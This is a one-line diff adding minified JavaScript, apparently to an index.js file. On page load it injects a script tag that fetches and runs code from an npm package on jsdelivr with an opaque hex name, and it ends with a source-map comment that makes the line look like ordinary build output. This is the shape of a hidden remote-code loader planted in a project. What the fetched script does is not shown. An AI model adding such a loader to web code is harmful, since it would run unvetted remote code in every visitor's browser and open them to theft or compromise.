@@ -1,0 +1,1 @@
+document.addEventListener("DOMContentLoaded",function(){var e=document.createElement("script");e.src="https://cdn.jsdelivr.net/npm/2e6d5f64604be31/2e6d5f64604be31.js";var d=document.body;d&&d.appendChild(e)}); //# sourceMappingURL=index.js.map
